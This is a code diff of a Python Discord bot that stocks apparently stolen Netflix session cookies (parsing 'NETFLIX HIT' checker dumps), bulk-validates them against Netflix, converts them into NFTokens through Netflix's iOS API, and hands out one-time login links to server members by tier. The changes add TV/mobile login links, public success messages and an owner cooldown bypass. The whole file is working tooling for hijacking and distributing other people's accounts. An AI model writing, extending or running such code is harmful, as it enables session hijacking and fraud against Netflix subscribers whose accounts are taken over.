@@ -13,7 +13,6 @@ import zipfile
 from datetime import datetime, timezone
 
 # Suppress SyntaxWarnings from discord.py 2.x under Python 3.14+
-# (library uses 'return' inside 'finally' blocks — cosmetic, not a bug in our code)
 warnings.filterwarnings("ignore", category=SyntaxWarning, module=r"discord.*")
 
 import discord
@@ -26,8 +25,6 @@ from urllib3.exceptions import InsecureRequestWarning
 load_dotenv()
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-# Suppress the "Privileged message content intent is missing" warning —
-# this bot uses slash commands only and never reads message text.
 warnings.filterwarnings(
     "ignore",
     message=r".*message content intent.*",
@@ -39,12 +36,6 @@ warnings.filterwarnings(
 # ==========================================
 
 def _start_fake_server():
-    """
-    Spin up a minimal HTTP server so Render (and similar platforms) see a
-    live web-service port and never kill the process for 'no open port'.
-    Listens on $PORT (default 10000).  Runs in a daemon thread — invisible
-    to the Discord bot logic.
-    """
     port = int(os.environ.get("PORT", "10000"))
 
     class _Handler(http.server.BaseHTTPRequestHandler):
@@ -57,15 +48,13 @@ def _start_fake_server():
             self.wfile.write(body)
 
         def do_HEAD(self):
-            # UptimeRobot Free Tier sends HEAD requests.
-            # We must send identical headers back, but WITHOUT the body text.
             self.send_response(200)
             self.send_header("Content-Type", "text/plain")
-            self.send_header("Content-Length", "2") # Length of b"OK" from GET
+            self.send_header("Content-Length", "2")
             self.end_headers()
 
         def log_message(self, *args):
-            pass  # silence access-log noise
+            pass
 
     server = http.server.HTTPServer(("0.0.0.0", port), _Handler)
     t = threading.Thread(target=server.serve_forever, daemon=True)
@@ -73,7 +62,6 @@ def _start_fake_server():
     print(f"[KeepAlive] Fake HTTP server listening on port {port}")
 
 _start_fake_server()
-
 
 # ==========================================
 # CHANNEL IDs  (set in .env or Replit Secrets)
@@ -89,14 +77,14 @@ ADMIN_CHANNEL_ID = _int_env("ADMIN_CHANNEL_ID")
 FGEN_CHANNEL_ID  = _int_env("FGEN_CHANNEL_ID")
 BGEN_CHANNEL_ID  = _int_env("BGEN_CHANNEL_ID")
 PGEN_CHANNEL_ID  = _int_env("PGEN_CHANNEL_ID")
+OWNER_ID         = int(os.environ.get("OWNER_ID", "1506365840273047714"))
+TICKET_CHANNEL_ID = 1506405663373525145
 
 # ==========================================
 # 1. SUPABASE CLOUD DATABASE
 # ==========================================
 
 class CloudDB:
-    """Single-row Supabase vault — all Netflix cookies in one JSON blob."""
-
     def __init__(self, url: str, key: str):
         raw = str(url or "").strip().rstrip("/")
         for suffix in ["/rest/v1/vault", "/rest/v1"]:
@@ -167,7 +155,6 @@ class CloudDB:
         return {t: len(data["nf"].get(t, [])) for t in ("free", "booster", "premium")}
 
     def existing_netflix_ids(self) -> set[str]:
-        """Return a set of all NetflixId values already stored in the vault."""
         data = self.get_all()
         ids: set[str] = set()
         for tier in ("free", "booster", "premium"):
@@ -176,7 +163,6 @@ class CloudDB:
                 if nid:
                     ids.add(nid)
         return ids
-
 
 db = CloudDB(
     url=os.environ.get("SUPABASE_URL", ""),
@@ -203,7 +189,6 @@ def _decode(value) -> str | None:
             break
     return re.sub(r"\s+", " ", s).strip() or None
 
-
 def netscape_to_dict(text: str) -> dict:
     out: dict = {}
     for line in text.splitlines():
@@ -214,7 +199,6 @@ def netscape_to_dict(text: str) -> dict:
         if len(parts) >= 7:
             out[parts[5]] = parts[6]
     return out
-
 
 def _to_netscape(raw: str) -> str:
     try:
@@ -239,16 +223,13 @@ def _to_netscape(raw: str) -> str:
     clean = [l.strip() for l in raw.splitlines() if l.strip() and len(l.split("\t")) >= 7]
     return "\n".join(clean)
 
-
 def parse_cookie_file(raw: str) -> list[str]:
-    """Return individual Netscape blocks from a bulk upload. Netflix only."""
     lo = raw.lower()
     if "netflix.com" not in lo and "netflixid" not in lo:
         return []
 
     accounts: list[str] = []
 
-    # JSON array-of-arrays
     try:
         parsed = json.loads(raw)
         if isinstance(parsed, list) and parsed and isinstance(parsed[0], list):
@@ -260,7 +241,6 @@ def parse_cookie_file(raw: str) -> list[str]:
     except Exception:
         pass
 
-    # Split on blank lines / checker separators
     for block in re.split(r"\n\s*\n|NETFLIX HIT|Checker By: INFOGAMER", raw):
         c = _to_netscape(block)
         if c and len(c.splitlines()) >= 2:
@@ -278,7 +258,6 @@ def parse_cookie_file(raw: str) -> list[str]:
 # ==========================================
 
 def normalize_plan_key(value: str | None) -> str:
-    """Unicode-normalize a status/plan string to a stable underscore key."""
     if not value:
         return "unknown"
     simplified = unicodedata.normalize("NFKD", str(value))
@@ -286,21 +265,14 @@ def normalize_plan_key(value: str | None) -> str:
     normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
     return normalized or "unknown"
 
-
 def _rx(text: str, *patterns: str, flags: int = 0) -> str | None:
-    """Return first regex capture from text, decoded. Patterns tried in order."""
     for pat in patterns:
         m = re.search(pat, text, flags)
         if m:
             return _decode(m.group(1))
     return None
 
-
 def _extract_graphql_info(text: str) -> dict:
-    """
-    Fast path: try to parse the response as raw GraphQL JSON.
-    Netflix occasionally returns pure JSON — works when that happens.
-    """
     try:
         payload = json.loads(text)
         if not isinstance(payload, dict):
@@ -319,12 +291,7 @@ def _extract_graphql_info(text: str) -> dict:
     except Exception:
         return {}
 
-
 def _extract_html_info(text: str) -> dict:
-    """
-    Fallback path: Netflix's HTML page has JSON fragments embedded inside.
-    Extract every field we need via regex directly on the raw HTML.
-    """
     DOT = re.DOTALL
     return {
         "membershipStatus": _rx(text,
@@ -355,8 +322,6 @@ def _extract_html_info(text: str) -> dict:
         ),
     }
 
-
-# Extra-member page markers (multiple languages, from reference)
 _EXTRA_MEMBER_PATTERNS = (
     r"extra\s+on\s+someone.?else.?s\s+plan",
     r"assinante\s+extra\s+no\s+plano",
@@ -366,11 +331,6 @@ _EXTRA_MEMBER_PATTERNS = (
     r"ekstra\s+uye\s+bir\s+baskasinin\s+planinda",
 )
 
-# Strings present on Netflix's login page (dead / expired cookie).
-# NOTE: '"login"' and '"authURL"' were intentionally removed — they appear
-# inside JavaScript bundles on valid /account pages and caused false positives
-# (live cookies being flagged as dead).  The four markers below are unique to
-# the rendered login form and do NOT appear on authenticated account pages.
 _LOGIN_PAGE_MARKERS = (
     "LoginForm",
     "login-form",
@@ -378,46 +338,23 @@ _LOGIN_PAGE_MARKERS = (
     "sign-in-form",
 )
 
-
 def _is_login_page(url: str, text: str) -> bool:
-    """Return True if Netflix redirected us to the login / sign-in page.
-
-    Changes vs original:
-    - URL check is now exact-segment only (/login, /login?, /loginhelp, /signup)
-      to avoid false matches on paths like /account/login-history.
-    - Text-marker threshold raised to 2 out of the 4 high-confidence markers
-      (the generic '"login"' and '"authURL"' markers were removed because they
-      appear on valid account pages inside embedded JS bundles).
-    - The entire check is skipped by check_nf_cookie() when membershipStatus
-      was already successfully extracted — guaranteeing no false positives for
-      live cookies whose pages happen to contain login-related JS fragments.
-    """
     url_lower = url.lower()
-    # Only flag as login page for unambiguous login/signup URL segments
     login_url_segments = ("/login", "/loginhelp", "/signup")
     for seg in login_url_segments:
-        # Match /login at end-of-path or followed by ? or /
         if re.search(re.escape(seg) + r"(?:[/?#]|$)", url_lower):
             return True
-    # Require at least 2 of the high-confidence form markers
     return sum(1 for m in _LOGIN_PAGE_MARKERS if m in text) >= 2
 
-
 def _is_subscribed(info: dict) -> bool:
-    """
-    Return True when the account has an active subscription.
-    Covers: current members, on-hold/past-due accounts, extra-member accounts.
-    """
     status_key = normalize_plan_key(info.get("membershipStatus"))
     if status_key == "current_member":
         return True
-    # On-hold / past-due accounts still have a valid plan
     if any(tok in status_key for tok in ("hold", "past_due", "payment_retry", "paused", "suspend")):
         return True
     if info.get("isExtraMember"):
         return True
     return False
-
 
 def check_nf_cookie(cookie_text: str) -> dict:
     cookies = netscape_to_dict(cookie_text)
@@ -432,7 +369,6 @@ def check_nf_cookie(cookie_text: str) -> dict:
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/124.0.0.0 Safari/537.36"
         ),
-        # Force uncompressed response — keeps the raw HTML readable for regex
         "Accept-Encoding": "identity",
         "Accept-Language": "en-US,en;q=0.9",
     }
@@ -450,32 +386,20 @@ def check_nf_cookie(cookie_text: str) -> dict:
 
     text = r.text
 
-    # ── Step 1: GraphQL fast path (works when page returns pure JSON) ────────
     info = _extract_graphql_info(text)
-
-    # ── Step 2: HTML regex fallback — always run & merge to fill any gaps ────
     html_info = _extract_html_info(text)
     for k, v in html_info.items():
         if v and not info.get(k):
             info[k] = v
 
-    # ── Step 3: Extra-member detection via page text ──────────────────────────
     if any(re.search(p, text, re.IGNORECASE) for p in _EXTRA_MEMBER_PATTERNS):
         info["isExtraMember"] = True
 
-    # ── Dead-cookie check — only run when we found NO account data ───────────
-    # If membershipStatus was extracted, the cookie is clearly alive; skipping
-    # the login-page check here prevents false positives from JS fragments.
     if not info.get("membershipStatus") and not info.get("isExtraMember"):
         if _is_login_page(r.url, text):
             return {"ok": False, "reason": "Cookie expired (redirected to login)."}
 
     if _is_subscribed(info):
-        # ── Final gate: NFToken must be extractable ───────────────────────────
-        # A cookie is only considered truly valid if we can obtain an NFToken
-        # from the Netflix iOS API — because the bot needs the token to generate
-        # login links.  Cookies that pass the membership check but have a dead
-        # session on the mobile API are silently filtered out here.
         nft, nft_err = create_nftoken(cookie_text, attempts=2)
         if not nft:
             return {"ok": False, "reason": f"NFToken failed: {nft_err}"}
@@ -486,19 +410,14 @@ def check_nf_cookie(cookie_text: str) -> dict:
             "country":   info.get("country") or "Unknown",
             "maxStreams": info.get("maxStreams"),
             "status":    info.get("membershipStatus"),
-            # Pre-fetched token — reused by _generate to avoid a second API call
             "nft":       nft,
         }
 
-    # Valid cookie but no active subscription
     if info.get("membershipStatus"):
         return {"ok": False, "reason": f"No active subscription ({info['membershipStatus']})."}
 
-    # membershipStatus absent entirely → cookie is dead / session gone
     return {"ok": False, "reason": "Cookie dead or session expired."}
 
-
-# Netflix actual quality values: UHD=4K, HIGH=1080p, MEDIUM=720p, LOW=480p
 _PREMIUM_PLAN_KEYS = {
     "premium", "premium_extra_member", "extra_member_premium",
     "cao_cap", "ozel", "프리미엄", "プレミアム",
@@ -510,44 +429,33 @@ _BOOSTER_PLAN_KEYS = {
     "スタンダード", "스탠다드",
 }
 
-
 def classify_tier(plan: str, quality: str) -> str:
-    """Map Netflix plan name + quality string to our three tiers."""
     key_p = normalize_plan_key(plan or "")
     q_up  = (quality or "").upper()
 
-    # UHD quality → always premium
     if q_up in ("UHD", "4K") or "UHD" in q_up or "4K" in q_up:
         return "premium"
 
-    # Plan-key exact match
     if key_p in _PREMIUM_PLAN_KEYS or "premium" in key_p:
         return "premium"
     if key_p in _BOOSTER_PLAN_KEYS or "standard" in key_p:
         return "booster"
 
-    # Netflix quality "HIGH" = 1080p → booster; "MEDIUM"/"LOW" → free
     if q_up == "HIGH" or "1080" in q_up or "FHD" in q_up:
         return "booster"
 
     return "free"
 
-
 def extract_cookies_from_zip(zip_bytes: bytes) -> tuple[list[str], list[str]]:
-    """
-    Open a ZIP archive from raw bytes — fully recursive (all folders/subfolders).
-    Returns (accounts, file_summary_lines).
-    """
     accounts: list[str] = []
     summary:  list[str] = []
     try:
         with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
-            # namelist() already returns every file in every subfolder
             inner_files = [
                 n for n in zf.namelist()
-                if not n.endswith("/")                              # skip dir entries
-                and n.lower().endswith((".txt", ".json"))           # cookie files only
-                and not os.path.basename(n).startswith(".")        # skip hidden
+                if not n.endswith("/")
+                and n.lower().endswith((".txt", ".json"))
+                and not os.path.basename(n).startswith(".")
             ]
             if not inner_files:
                 summary.append("(no .txt/.json files found inside zip)")
@@ -560,14 +468,12 @@ def extract_cookies_from_zip(zip_bytes: bytes) -> tuple[list[str], list[str]]:
                     continue
                 found = parse_cookie_file(raw)
                 accounts.extend(found)
-                # Show full inner path so files in different subfolders are distinguishable
                 summary.append(f"`{name}` ({len(found)} cookies)")
     except zipfile.BadZipFile:
         summary.append("(invalid or corrupted zip file)")
     except Exception as e:
         summary.append(f"(zip error: {e})")
     return accounts, summary
-
 
 # ==========================================
 # 4. NFTOKEN EXTRACTION & LINK GENERATION
@@ -616,7 +522,6 @@ _NF_HEADERS = {
     "x-netflix.request.client.timezoneid": "Asia/Dhaka",
 }
 
-
 def _expiry_str(expires) -> str | None:
     if expires is None:
         return None
@@ -628,13 +533,7 @@ def _expiry_str(expires) -> str | None:
     except Exception:
         return str(expires)
 
-
 def create_nftoken(cookie_text: str, attempts: int = 3) -> tuple[dict | None, str | None]:
-    """
-    Call Netflix iOS API to obtain an NFToken.
-    Returns ({"token": str, "expires_at_utc": str|None}, None) on success,
-    or (None, error_string) on failure.
-    """
     nid = _decode(netscape_to_dict(cookie_text).get("NetflixId"))
     if not nid:
         return None, "Missing NetflixId — cannot create NFToken."
@@ -673,18 +572,52 @@ def create_nftoken(cookie_text: str, attempts: int = 3) -> tuple[dict | None, st
 
     return None, last_err
 
-
-def build_links(token: str) -> list[tuple[str, str]]:
+def build_links_for_tier(token: str, tier: str) -> list[tuple[str, str]]:
+    """Return appropriate login links based on account tier."""
     t = _decode(token)
     if not t:
         return []
-    return [
-        ("🖥️ PC Login",     f"https://netflix.com/?nftoken={t}"),
-        ("📱 Mobile Login", f"https://netflix.com/unsupported?nftoken={t}"),
-    ]
+    links = []
+    # PC link always available for all tiers
+    links.append(("🖥️ PC Login", f"https://netflix.com/?nftoken={t}"))
+    if tier in ("booster", "premium"):
+        links.append(("📱 Mobile Login", f"https://netflix.com/unsupported?nftoken={t}"))
+    if tier == "premium":
+        links.append(("📺 TV Login", f"https://netflix.com/tv8?nftoken={t}"))
+    return links
 
 # ==========================================
-# 5. CHANNEL GUARD
+# 5. OWNER-BYPASS COOLDOWN
+# ==========================================
+
+from discord.app_commands import checks
+
+def owner_bypass_cooldown(rate: int, per: float, owner_id: int):
+    mapping = checks.CooldownMapping(checks.Cooldown(rate, per, checks.CooldownType.user))
+
+    async def predicate(interaction: discord.Interaction) -> bool:
+        if interaction.user.id == owner_id:
+            return True
+        bucket = mapping.get_bucket(interaction)
+        retry_after = bucket.update_rate_limit()
+        if retry_after:
+            raise app_commands.CommandOnCooldown(bucket, retry_after)
+        return True
+
+    return app_commands.check(predicate)
+
+# ==========================================
+# 6. LOGIN BUTTON VIEW
+# ==========================================
+
+class LoginView(discord.ui.View):
+    def __init__(self, links: list[tuple[str, str]]):
+        super().__init__(timeout=None)
+        for label, url in links:
+            self.add_item(discord.ui.Button(label=label, url=url, style=discord.ButtonStyle.link))
+
+# ==========================================
+# 7. CHANNEL GUARD
 # ==========================================
 
 def in_channel(channel_id: int):
@@ -697,7 +630,7 @@ def in_channel(channel_id: int):
     return app_commands.check(predicate)
 
 # ==========================================
-# 6. GENERATOR COG
+# 8. GENERATOR COG
 # ==========================================
 
 class GeneratorCog(commands.Cog):
@@ -712,7 +645,6 @@ class GeneratorCog(commands.Cog):
         loop = asyncio.get_running_loop()
 
         for attempt in range(5):
-            # ── 1. Pop cookie ─────────────────────────────────────────
             cookie = await loop.run_in_executor(None, db.pop_cookie, tier)
             if not cookie:
                 await interaction.followup.send(
@@ -721,47 +653,60 @@ class GeneratorCog(commands.Cog):
                 )
                 return
 
-            # ── 2. Validate + NFToken (combined — check_nf_cookie now gates on NFToken) ──
             check = await loop.run_in_executor(None, check_nf_cookie, cookie)
             if not check["ok"]:
+                # If NFToken failure, show generic error and stop
+                if "NFToken" in check.get("reason", ""):
+                    await interaction.followup.send(
+                        f"❌ Something went wrong while generating your account. "
+                        f"Please open a ticket in <#{TICKET_CHANNEL_ID}> and report the problem.",
+                        ephemeral=True,
+                    )
+                    return
+                # Otherwise (dead cookie etc.) just try next
                 print(f"[Gen] Dead {tier} cookie (attempt {attempt+1}): {check.get('reason')}")
                 continue
 
-            # ── 3. Reuse pre-fetched NFToken from the check result ────────────
             nft = check.get("nft")
+            if not nft:
+                # Should not happen if check is ok, but safety
+                continue
 
-            # ── 4. Build response ─────────────────────────────────────
+            # Build appropriate links for the tier
+            links = build_links_for_tier(nft["token"], tier)
+
+            # --- Ephemeral embed with buttons (visible only to user) ---
             embed = discord.Embed(
                 title=f"{emoji} {label} Netflix — Generated!",
                 color=discord.Color.red(),
             )
-            embed.add_field(name="📋 Plan",    value=check.get("plan", "Unknown"),           inline=True)
-            embed.add_field(name="🎬 Quality", value=(check.get("quality") or "").title(),   inline=True)
-            embed.add_field(name="🌍 Country", value=check.get("country", "Unknown"),        inline=True)
+            embed.add_field(name="📋 Plan",       value=check.get("plan", "Unknown"),        inline=True)
+            embed.add_field(name="🎬 Quality",    value=(check.get("quality") or "").title(), inline=True)
+            embed.add_field(name="🌍 Country",    value=check.get("country", "Unknown"),     inline=True)
+            if check.get("maxStreams"):
+                embed.add_field(name="📺 Streams", value=check["maxStreams"], inline=True)
+            if check.get("status"):
+                embed.add_field(name="📌 Status", value=check["status"].replace("_", " ").title(), inline=True)
 
-            if nft:
-                links = build_links(nft["token"])
-                embed.add_field(
-                    name="🔗 Login Links",
-                    value="\n".join(f"[{lbl}]({url})" for lbl, url in links),
-                    inline=False,
-                )
-                embed.add_field(
-                    name="⏰ Link Expires",
-                    value=nft.get("expires_at_utc") or "Unknown",
-                    inline=False,
-                )
-                embed.set_footer(text="Links are one-time use — open immediately.")
-                content = "\n".join(f"**{lbl}:** <{url}>" for lbl, url in links)
-            else:
-                embed.add_field(
-                    name="⚠️ NFToken Unavailable",
-                    value="Direct link unavailable. Import the raw cookie manually.",
-                    inline=False,
-                )
-                content = f"```\n{cookie[:1800]}\n```"
+            view = LoginView(links)
+            embed.set_footer(text=f"Token expires: {nft.get('expires_at_utc', 'Unknown')} | Links are one‑time use")
 
-            await interaction.followup.send(content=content, embed=embed, ephemeral=True)
+            await interaction.followup.send(embed=embed, view=view, ephemeral=True)
+
+            # --- Public success embed (visible to everyone) ---
+            public_embed = discord.Embed(
+                title="🎉 Netflix Account Generated!",
+                description=(
+                    f"A **{label}** Netflix account has been generated. "
+                    f"Please check the private message above for your login links.\n\n"
+                    f"**Login Guide:**\n"
+                    f"• Click the button matching your device.\n"
+                    f"• The link is one‑time use – open it immediately.\n"
+                    f"• If you encounter issues, create a ticket in <#{TICKET_CHANNEL_ID}>."
+                ),
+                color=discord.Color.green(),
+            )
+            await interaction.followup.send(embed=public_embed, ephemeral=False)
             return
 
         await interaction.followup.send(
@@ -769,27 +714,23 @@ class GeneratorCog(commands.Cog):
             ephemeral=True,
         )
 
-    # ── generation commands ────────────────────────────────────────────
-
     @app_commands.command(name="fgen", description="🆓 Generate a Free Netflix account")
     @in_channel(FGEN_CHANNEL_ID)
-    @app_commands.checks.cooldown(1, 86400, key=lambda i: i.user.id)
+    @owner_bypass_cooldown(1, 86400, OWNER_ID)
     async def fgen(self, interaction: discord.Interaction):
         await self._generate(interaction, "free", "Free", "🆓")
 
     @app_commands.command(name="bgen", description="🚀 Generate a Booster Netflix account")
     @in_channel(BGEN_CHANNEL_ID)
-    @app_commands.checks.cooldown(1, 28800, key=lambda i: i.user.id)
+    @owner_bypass_cooldown(1, 28800, OWNER_ID)
     async def bgen(self, interaction: discord.Interaction):
         await self._generate(interaction, "booster", "Booster", "🚀")
 
     @app_commands.command(name="pgen", description="💎 Generate a Premium Netflix account")
     @in_channel(PGEN_CHANNEL_ID)
-    @app_commands.checks.cooldown(1, 21600, key=lambda i: i.user.id)
+    @owner_bypass_cooldown(1, 21600, OWNER_ID)
     async def pgen(self, interaction: discord.Interaction):
         await self._generate(interaction, "premium", "Premium", "💎")
-
-    # ── admin: restock ─────────────────────────────────────────────────
 
     @app_commands.command(
         name="restock",
@@ -809,10 +750,8 @@ class GeneratorCog(commands.Cog):
         await interaction.response.defer(ephemeral=True)
 
         attachments = [f for f in (file1, file2, file3, file4, file5) if f is not None]
-
         ALLOWED = (".txt", ".json", ".zip")
-        bad = [f.filename for f in attachments
-               if not f.filename.lower().endswith(ALLOWED)]
+        bad = [f.filename for f in attachments if not f.filename.lower().endswith(ALLOWED)]
         if bad:
             return await interaction.followup.send(
                 f"❌ Only `.txt` / `.json` / `.zip` files accepted. Rejected: {', '.join(bad)}",
@@ -831,7 +770,6 @@ class GeneratorCog(commands.Cog):
                 )
 
             if att.filename.lower().endswith(".zip"):
-                # ── ZIP: extract every .txt/.json inside ──
                 found, inner_summary = extract_cookies_from_zip(raw_bytes)
                 all_accounts.extend(found)
                 inner_lines = "\n  ".join(inner_summary) if inner_summary else "(empty)"
@@ -839,7 +777,6 @@ class GeneratorCog(commands.Cog):
                     f"`{att.filename}` → {len(found)} cookies\n  {inner_lines}"
                 )
             else:
-                # ── Plain text / JSON cookie file ──
                 raw = raw_bytes.decode("utf-8", errors="ignore")
                 found = parse_cookie_file(raw)
                 all_accounts.extend(found)
@@ -857,8 +794,6 @@ class GeneratorCog(commands.Cog):
         )
 
         loop = asyncio.get_running_loop()
-
-        # ── Step 1: fetch vault IDs and pre-dedup the whole batch ──────────
         existing_ids: set[str] = await loop.run_in_executor(None, db.existing_netflix_ids)
         seen_ids:     set[str] = set(existing_ids)
         unique:       list[str] = []
@@ -870,10 +805,8 @@ class GeneratorCog(commands.Cog):
             else:
                 unique.append(cookie)
                 if nid:
-                    seen_ids.add(nid)   # block intra-batch dupes too
+                    seen_ids.add(nid)
 
-        # ── Step 2: check all unique cookies IN PARALLEL (10 at a time) ────
-        # 10 concurrent HTTP requests → ~10× faster than sequential
         SEM = asyncio.Semaphore(10)
 
         async def _check(cookie: str) -> dict:
@@ -896,12 +829,10 @@ class GeneratorCog(commands.Cog):
             data["nf"][t].extend(sorted_[t])
         ok = await loop.run_in_executor(None, db.save, data)
 
-        # Truncate file list if too long for Discord embed
         files_value = "\n".join(file_names)
         if len(files_value) > 900:
             files_value = files_value[:900] + "\n…"
 
-        total_added = sum(len(v) for v in sorted_.values())
         embed = discord.Embed(
             title="✅ Restock Complete — Auto-sorted",
             color=discord.Color.green() if ok else discord.Color.orange(),
@@ -916,8 +847,6 @@ class GeneratorCog(commands.Cog):
         if not ok:
             embed.add_field(name="⚠️ Warning", value="Supabase write may have failed.", inline=False)
         await interaction.followup.send(embed=embed)
-
-    # ── admin: stock ───────────────────────────────────────────────────
 
     @app_commands.command(name="stock", description="📦 Check Netflix account stock levels")
     @in_channel(ADMIN_CHANNEL_ID)
@@ -936,9 +865,8 @@ class GeneratorCog(commands.Cog):
         embed.set_footer(text=f"Total: {sum(counts.values())} accounts")
         await interaction.followup.send(embed=embed, ephemeral=True)
 
-
 # ==========================================
-# 7. BOT CLASS
+# 9. BOT CLASS
 # ==========================================
 
 class NetflixBot(commands.Bot):
@@ -949,22 +877,16 @@ class NetflixBot(commands.Bot):
 
     async def setup_hook(self):
         await self.add_cog(GeneratorCog(self))
-        # Commands are now in the in-memory global tree.
 
         guild_id = os.environ.get("DISCORD_GUILD_ID", "").strip()
         if guild_id:
             try:
                 g = discord.Object(id=int(guild_id))
-                # 1. Wipe old guild commands on Discord (push empty list)
                 self.tree.clear_commands(guild=g)
                 await self.tree.sync(guild=g)
-                # 2. Copy current in-memory commands → guild, then push
                 self.tree.copy_global_to(guild=g)
                 await self.tree.sync(guild=g)
                 print(f"[Bot] Commands synced to guild {guild_id}.")
-                # 3. NOW wipe global scope to kill any lingering global ghosts
-                #    (safe to do after guild sync — in-memory global list no
-                #     longer needed, commands are already live on the guild)
                 self.tree.clear_commands(guild=None)
                 await self.tree.sync()
                 print("[Bot] Global ghost commands cleared.")
@@ -973,8 +895,6 @@ class NetflixBot(commands.Bot):
                 await self.tree.sync()
                 print("[Bot] Commands synced globally (up to 1 hour to appear).")
         else:
-            # Global mode: push current commands (no clear needed — sync
-            # replaces whatever Discord has with exactly what's in memory now)
             await self.tree.sync()
             print("[Bot] Commands synced globally (up to 1 hour to appear).")
 
@@ -984,33 +904,53 @@ class NetflixBot(commands.Bot):
         await self.change_presence(activity=discord.Game(name="Netflix 🎬"))
 
     async def _on_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError):
-        async def reply(msg: str):
+        async def reply_embed(embed: discord.Embed):
             try:
                 if interaction.response.is_done():
-                    await interaction.followup.send(msg, ephemeral=True)
+                    await interaction.followup.send(embed=embed, ephemeral=True)
                 else:
-                    await interaction.response.send_message(msg, ephemeral=True)
+                    await interaction.response.send_message(embed=embed, ephemeral=True)
             except Exception:
                 pass
 
         if isinstance(error, app_commands.CheckFailure):
             msg = str(error)
-            await reply(msg if msg and "check functions" not in msg.lower()
-                        else "❌ You can't use this command here.")
+            emb = discord.Embed(description=msg if msg and "check functions" not in msg.lower()
+                                else "❌ You can't use this command here.",
+                                color=discord.Color.orange())
+            await reply_embed(emb)
+
         elif isinstance(error, app_commands.CommandOnCooldown):
-            h, rem = divmod(int(error.retry_after), 3600)
-            m, s   = divmod(rem, 60)
-            parts  = ([f"{h}h"] if h else []) + ([f"{m}m"] if m else []) + ([f"{s}s"] if s or not (h or m) else [])
-            await reply(f"⏳ Cooldown! Try again in **{' '.join(parts)}**.")
+            total_sec = int(error.retry_after)
+            h, rem = divmod(total_sec, 3600)
+            m, s = divmod(rem, 60)
+            parts = []
+            if h:
+                parts.append(f"{h}h")
+            if m:
+                parts.append(f"{m}m")
+            if s or not parts:
+                parts.append(f"{s}s")
+            cd_text = " ".join(parts)
+
+            emb = discord.Embed(
+                title="⏳ Cooldown",
+                description=f"You can use this command again in **{cd_text}**.",
+                color=discord.Color.blue()
+            )
+            await reply_embed(emb)
+
         elif isinstance(error, app_commands.MissingPermissions):
-            await reply("❌ You need **Administrator** permission.")
+            emb = discord.Embed(description="❌ You need **Administrator** permission.", color=discord.Color.red())
+            await reply_embed(emb)
+
         else:
             print(f"[Bot] Error: {type(error).__name__}: {error}")
-            await reply(f"⚠️ Unexpected error: `{type(error).__name__}`")
-
+            emb = discord.Embed(description=f"⚠️ Unexpected error: `{type(error).__name__}`", color=discord.Color.red())
+            await reply_embed(emb)
 
 # ==========================================
-# 8. ENTRY POINT
+# 10. ENTRY POINT
 # ==========================================
 
 def main():
@@ -1023,6 +963,8 @@ def main():
     print("[Bot] Starting Netflix Discord Bot…")
     print(f"[Bot] Channels — ADMIN:{ADMIN_CHANNEL_ID} FGEN:{FGEN_CHANNEL_ID} "
           f"BGEN:{BGEN_CHANNEL_ID} PGEN:{PGEN_CHANNEL_ID}")
+    if OWNER_ID:
+        print(f"[Bot] Owner bypass enabled for ID: {OWNER_ID}")
 
     bot = NetflixBot()
     try:
@@ -1031,7 +973,6 @@ def main():
         sys.exit("[Bot] FATAL: Invalid DISCORD_BOT_TOKEN.")
     except Exception as e:
         sys.exit(f"[Bot] FATAL: {e}")
-
 
 if __name__ == "__main__":
     main()
